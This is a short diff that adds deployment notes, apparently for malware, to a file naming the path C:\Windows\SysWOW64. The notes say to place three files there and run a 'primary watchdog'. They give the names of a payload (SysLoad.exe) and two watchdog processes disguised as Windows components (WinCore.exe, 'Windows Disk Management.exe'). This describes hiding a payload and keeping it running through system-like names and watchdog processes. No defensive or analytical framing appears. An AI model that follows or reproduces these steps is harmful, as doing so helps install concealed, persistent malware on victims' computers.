@@ -1,1 +1,8 @@
 C:\Windows\SysWOW64\
+
+
+^^PUT ALL THREE FILES IN ABOVE FILEPATH THEN RUN PRIMARY WATCHDOG^^
+
+Payload Name: SysLoad.exe
+Primary Watchdog Name: WinCore.exe
+Secondary Watchdog Name: Windows Disk Management.exe
